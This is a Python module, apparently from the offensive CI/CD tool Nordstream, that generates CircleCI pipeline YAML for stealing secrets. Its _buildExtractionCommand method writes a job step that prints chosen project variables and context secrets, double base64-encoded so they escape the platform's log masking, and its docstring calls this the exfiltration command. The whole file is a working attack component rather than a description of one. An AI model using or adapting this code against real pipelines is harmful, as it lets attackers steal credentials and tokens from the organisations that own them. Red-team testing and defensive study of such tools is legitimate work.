import copy
from nordstream.utils.log import logger
from nordstream.yaml.generator import YamlGeneratorBase


class CircleCIPipelineGenerator(YamlGeneratorBase):
    _DEFAULT_TEMPLATE = {
        "version": "2.1",
        "jobs": {
            "init": {
                "docker": [{"image": "cimg/base:stable"}],
                "steps": [
                    {
                        "run": {
                            "name": "command",
                            "command": "echo 'no secrets'",
                        }
                    }
                ],
            }
        },
        "workflows": {
            "main": {
                "jobs": [
                    "init"
                ]
            }
        },
    }

    def __init__(self):
        self._defaultTemplate = copy.deepcopy(CircleCIPipelineGenerator._DEFAULT_TEMPLATE)

    def generatePipelineForSecretsExtraction(self, projectVars, contexts=None):
        """Populate the template with the vars to extract and optional context names."""
        self._buildExtractionCommand(projectVars or [])
        if contexts:
            self.addContextsToYaml(contexts)

    def _buildExtractionCommand(self, varNames):
        """Build the exfiltration command for the given list of variable names."""
        if not varNames:
            self._defaultTemplate["jobs"]["init"]["steps"][0]["run"]["command"] = (
                "echo 'no secrets configured' | base64 -w0 | base64 -w0"
            )
            return

        pairs = " ".join(f'"secret_{v}=${v}"' for v in varNames)
        command = f"printf '%s\\n' {pairs} | base64 -w0 | base64 -w0"
        self._defaultTemplate["jobs"]["init"]["steps"][0]["run"]["command"] = command

    def addContextsToYaml(self, contexts):
        self._defaultTemplate["workflows"]["main"]["jobs"][0] = {
            "init": {"context": list(contexts)}
        }
